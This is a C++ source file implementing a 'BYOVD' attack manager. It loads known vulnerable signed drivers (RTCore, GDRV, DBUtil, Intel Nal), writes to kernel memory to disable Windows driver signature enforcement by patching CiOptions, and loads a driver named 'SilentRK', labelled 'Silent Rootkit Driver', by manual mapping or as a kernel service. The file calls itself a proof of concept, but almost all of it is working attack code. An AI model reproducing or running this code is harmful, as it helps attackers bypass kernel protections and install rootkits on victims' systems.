/**
 * @file BYOVDManager.cpp
 * @author Gregory King
 * @date September 9, 2025
 * @brief Implementation of BYOVD attack manager
 */

#include "BYOVDManager.h"
#include "Providers/ProviderManager.h"
#include "ManualMapper.h"
#include "DSE.h"
#include "Utils.h"
#include <iostream>
#include <fstream>
#include <thread>
#include <chrono>

namespace KernelMode {
    namespace BYOVD {

        BYOVDManager& BYOVDManager::GetInstance() {
            static BYOVDManager instance;
            return instance;
        }

        bool BYOVDManager::Initialize() {
            if (initialized) return true;
            std::wcout << L"[+] Initializing BYOVD Manager..." << std::endl;
            initialized = true;
            return true;
        }

        BYOVDResult BYOVDManager::LoadSilentRK(const std::wstring& silentRKPath, BYOVDMethod method) {
             // LIFECYCLE-001 FIX: Reset init state at start
             initState = InitializationState();
             
             if (!initialized) Initialize();

             std::wcout << L"[+] Starting BYOVD attack to load: " << silentRKPath << std::endl;
             
             if (!ValidateDriverFile(silentRKPath)) {
                 std::wcerr << L"[-] SilentRK driver file not found or invalid." << std::endl;
                 RollbackInitialization();  // LIFECYCLE-001: Rollback on failure
                 return BYOVDResult::SilentRKNotFound;
             }

             // Step 1: Load a vulnerable driver (Provider)
             ULONG bestDriver = SelectBestVulnerableDriver();
             BYOVDResult driverLoadResult = LoadVulnerableDriver(bestDriver);
             if (driverLoadResult != BYOVDResult::Success) {
                 std::wcerr << L"[-] Failed to load vulnerable driver." << std::endl;
                 RollbackInitialization();  // LIFECYCLE-001: Rollback on failure
                 return driverLoadResult;
             }
             initState.providerLoaded = true;  // LIFECYCLE-001: Track success

             // Step 2: Exploit based on method
             BYOVDResult result = BYOVDResult::UnknownError;
             
             if (method == BYOVDMethod::ManualMapping) {
                 result = MapSilentRK(silentRKPath);
             } else if (method == BYOVDMethod::DSEDisable) {
                 if (DisableDSE() != BYOVDResult::Success) {
                     std::wcerr << L"[-] DSE bypass failed." << std::endl;
                     RollbackInitialization();  // LIFECYCLE-001: Rollback on failure
                     return BYOVDResult::DSEBypassFailed;
                 }
                 initState.dseDisabled = true;  // LIFECYCLE-001: Track DSE disable
                 result = LoadSilentRKDirect(silentRKPath);
             } else if (method == BYOVDMethod::DirectDriverLoad) {
                 result = MapSilentRK(silentRKPath);
             } else {
                 result = MapSilentRK(silentRKPath);  // Default fallback
             }
             
             // LIFECYCLE-001: Rollback if final result is failure
             if (result != BYOVDResult::Success) {
                 std::wcerr << L"[-] Failed to load SilentRK, performing rollback..." << std::endl;
                 RollbackInitialization();
             }
             
             return result;
        }

        std::vector<ULONG> BYOVDManager::GetAvailableVulnerableDrivers() {
            // Return IDs of supported drivers from ProviderManager
            // For now, we return hardcoded IDs matching ProviderType enum
            return { 0, 1, 2 }; // RTCore, GDRV, DBUtil
        }

        bool BYOVDManager::IsSilentRKLoaded() {
            // Simplified check: Is the driver name in the module list?
            // "SilentRK" or expected module name
            return Utils::GetKernelModuleBase("SilentRK.sys") != 0;
        }

        bool BYOVDManager::CleanupBYOVD() {
            // Unload whatever provider is active
            // ProviderManager logic usually handles this on destruction, 
            // but we can try to force clean up here if we had a persistent handle.
            // For this POC, we assume single-shot execution.
            return true;
        }

        // Private Implementation

        BYOVDResult BYOVDManager::LoadVulnerableDriver(ULONG driverId) {
            std::wcout << L"[*] Requesting ProviderManager to load driver ID: " << driverId << std::endl;
            
            Providers::ProviderManager pm;
            // Map our generic driver ID to Provider ID.
            // For this POC, we default to Intel Nal if 0 is passed, or explicit ID.
            auto providerID = (driverId == 0) ? Providers::PROVIDER_INTEL_NAL : (Providers::ProviderType)driverId;

            this->activeProvider = pm.LoadProvider(providerID, false);
            
            if (!this->activeProvider) {
                 std::wcerr << L"[-] Failed to load vulnerable driver provider." << std::endl;
                 return BYOVDResult::VulnerableDriverLoadFailed;
            }
            
            this->loadedVulnerableDriver = driverId;
            return BYOVDResult::Success;
        }

        BYOVDResult BYOVDManager::DisableDSE() {
             std::wcout << L"[*] Attempting DSE Bypass..." << std::endl;
             
             if (!this->activeProvider) {
                 if (LoadVulnerableDriver(0) != BYOVDResult::Success) {
                      return BYOVDResult::VulnerableDriverLoadFailed;
                 }
             }

             DSE dse(this->activeProvider.get());
             // DSE address lookup and patch
             uintptr_t ciOptions = dse.FindCiOptionsWithRobustPattern();
             if (!ciOptions) {
                 return BYOVDResult::DSEBypassFailed;
             }
             
             // Disable DSE
             uint32_t value = 0; // Disable
             if (this->activeProvider->WriteKernelMemory(ciOptions, &value, sizeof(value))) {
                 std::wcout << L"[+] DSE Disabled (CiOptions patched)" << std::endl;
                 return BYOVDResult::Success;
             }
             
             return BYOVDResult::DSEBypassFailed;
        }

        BYOVDResult BYOVDManager::MapSilentRK(const std::wstring& silentRKPath) {
            std::wcout << L"[*] Initializing Manual Map of: " << silentRKPath << std::endl;
            
            if (!this->activeProvider) {
                 if (LoadVulnerableDriver(0) != BYOVDResult::Success) {
                      return BYOVDResult::VulnerableDriverLoadFailed;
                 }
            }
            
            ManualMapper mapper(this->activeProvider);
            uintptr_t baseAddress = mapper.MapDriver(silentRKPath);
            
            if (baseAddress != 0) {
                 std::wcout << L"[+] SilentRK managed successfully at: 0x" << std::hex << baseAddress << std::endl;
                 return BYOVDResult::Success;
            }
            
            return BYOVDResult::SilentRKLoadFailed;
        }

        BYOVDResult BYOVDManager::LoadSilentRKDirect(const std::wstring& silentRKPath) {
             // Uses NtLoadDriver after DSE disable
             // Implementation: Create Service -> Start Service
             
             std::wstring serviceName = L"SilentRK";
             std::wstring serviceDesc = L"Silent Rootkit Driver";
             
             // LIFECYCLE-001: Track service name for rollback
             initState.silentRKServiceName = serviceName;
             
             SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
             if (!hSCManager) return BYOVDResult::InsufficientPrivileges;
             
             SC_HANDLE hService = CreateServiceW(hSCManager, serviceName.c_str(), serviceDesc.c_str(),
                 SERVICE_START | DELETE | SERVICE_STOP, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                 SERVICE_ERROR_IGNORE, silentRKPath.c_str(), NULL, NULL, NULL, NULL, NULL);
                 
             if (!hService) {
                 if (GetLastError() == ERROR_SERVICE_EXISTS) {
                     hService = OpenServiceW(hSCManager, serviceName.c_str(), SERVICE_START);
                 }
             }
             
             if (hService) {
                 initState.silentRKServiceCreated = true;  // LIFECYCLE-001: Track creation
             }
             
             if (!hService) {
                 CloseServiceHandle(hSCManager);
                 return BYOVDResult::UnknownError;
             }
             
             if (StartService(hService, 0, NULL)) {
                 std::wcout << L"[+] SilentRK loaded as a service!" << std::endl;
                 initState.silentRKLoaded = true;  // LIFECYCLE-001: Track success
                 CloseServiceHandle(hService);
                 CloseServiceHandle(hSCManager);
                 return BYOVDResult::Success;
             }
             
             std::wcerr << L"[-] Failed to start service: " << GetLastError() << std::endl;
             CloseServiceHandle(hService);
             CloseServiceHandle(hSCManager);
             return BYOVDResult::SilentRKLoadFailed;
        }

        // Implemented Exploitation Dispatchers
        BYOVDResult BYOVDManager::ExploitVulnerableDriver(ULONG driverId, const std::wstring& silentRKPath, BYOVDMethod method) {
            if (LoadVulnerableDriver(driverId) != BYOVDResult::Success) {
                return BYOVDResult::VulnerableDriverLoadFailed;
            }
            
            if (method == BYOVDMethod::DSEDisable) {
                if (DisableDSE() != BYOVDResult::Success) {
                    return BYOVDResult::DSEBypassFailed;
                }
                return LoadSilentRKDirect(silentRKPath);
            }
            
            // Default to Manual Mapping
            return MapSilentRK(silentRKPath);
        }

        BYOVDResult BYOVDManager::ExploitGDRV(const std::wstring& silentRKPath, BYOVDMethod method) {
            return ExploitVulnerableDriver(Providers::PROVIDER_GDRV, silentRKPath, method);
        }
        
        BYOVDResult BYOVDManager::ExploitRTCore(const std::wstring& silentRKPath, BYOVDMethod method) {
            return ExploitVulnerableDriver(Providers::PROVIDER_RTCORE64, silentRKPath, method);
        }
        
        BYOVDResult BYOVDManager::ExploitDBUtil(const std::wstring& silentRKPath, BYOVDMethod method) {
            return ExploitVulnerableDriver(Providers::PROVIDER_DBUTIL, silentRKPath, method);
        }

        ULONG BYOVDManager::SelectBestVulnerableDriver() { 
            // Prefer Intel Nal as it is the KDU default and robust
            return Providers::PROVIDER_INTEL_NAL; 
        }
        
        std::wstring BYOVDManager::ResultToString(BYOVDResult result) {
            switch(result) {
                case BYOVDResult::Success: return L"Success";
                case BYOVDResult::VulnerableDriverNotFound: return L"Vulnerable Driver Not Found";
                // ... (simplified)
                default: return L"Unknown";
            }
        }

        bool BYOVDManager::ValidateDriverFile(const std::wstring& driverPath) {
            std::ifstream f(driverPath);
            return f.good();
        }
        
        // LIFECYCLE-001: Rollback helper implementation
        void BYOVDManager::RollbackInitialization() {
            std::wcout << L"[*] Performing rollback of partial initialization..." << std::endl;
            
            // Restore DSE if it was disabled
            if (initState.dseDisabled && activeProvider) {
                std::wcout << L"[*] Restoring DSE..." << std::endl;
                DSE dse(activeProvider.get());
                if (dse.Restore()) {
                    std::wcout << L"[+] DSE restored during rollback." << std::endl;
                } else {
                    std::wcerr << L"[-] WARNING: Failed to restore DSE during rollback!" << std::endl;
                }
                initState.dseDisabled = false;
            }
            
            // Stop and delete SilentRK service if created
            if (initState.silentRKServiceCreated && !initState.silentRKServiceName.empty()) {
                std::wcout << L"[*] Removing SilentRK service..." << std::endl;
                SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
                if (hSCManager) {
                    SC_HANDLE hService = OpenServiceW(hSCManager, initState.silentRKServiceName.c_str(), SERVICE_STOP | DELETE);
                    if (hService) {
                        SERVICE_STATUS status;
                        ControlService(hService, SERVICE_CONTROL_STOP, &status);
                        DeleteService(hService);
                        CloseServiceHandle(hService);
                        std::wcout << L"[+] SilentRK service removed." << std::endl;
                    }
                    CloseServiceHandle(hSCManager);
                }
                initState.silentRKServiceCreated = false;
            }
            
            // Deinitialize provider if loaded
            if (initState.providerLoaded && activeProvider) {
                std::wcout << L"[*] Deinitializing provider..." << std::endl;
                activeProvider->Deinitialize();
                activeProvider.reset();
                std::wcout << L"[+] Provider deinitialized." << std::endl;
                initState.providerLoaded = false;
            }
            
            // Clean up extracted driver file if needed
            if (initState.driverExtracted && !initState.extractedDriverPath.empty()) {
                std::wcout << L"[*] Removing extracted driver file..." << std::endl;
                DeleteFileW(initState.extractedDriverPath.c_str());
                initState.driverExtracted = false;
            }
            
            // Reset state
            loadedVulnerableDriver = 0;
            loadedSilentRKPath.clear();
            
            std::wcout << L"[+] Rollback completed." << std::endl;
        }

    }
}
